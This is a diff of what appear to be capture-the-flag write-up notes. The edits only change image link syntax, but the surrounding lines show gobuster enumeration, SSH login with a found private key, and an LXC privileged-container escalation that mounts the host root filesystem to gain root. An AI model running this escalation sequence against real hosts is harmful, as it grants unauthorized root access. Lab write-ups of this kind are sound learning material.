@@ -1833,7 +1833,7 @@ gobuster dir -u <URL> -w <wordlist>
 
 We found a page called /uploads
 
-![[109.png]]
+![enum result](Assets/109.png)
 
 We found 3 things in that which are dict1.lst -> dictionary, manifesto -> waste thing and third being an image called meme.jpg
 
@@ -1865,7 +1865,7 @@ chmod 600 id_rsa
 ssh -i id_rsa john@<IP>
 ```
 
-![[111.png]]
+![enum result](Assets/111.png)
 
 Now we are logged in as john
 
@@ -1923,7 +1923,7 @@ lxc image list
 lxc init alpine privesc -c security.privileged=true
 ```
 
-![[112.png]]
+![enum result](Assets/112.png)
 
 ```
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
@@ -1937,7 +1937,7 @@ lxc start privesc
 lxc exec privesc /bin/sh
 ```
 
-![[113.png]]
+![enum result](Assets/113.png)
 
 Now we are root
 
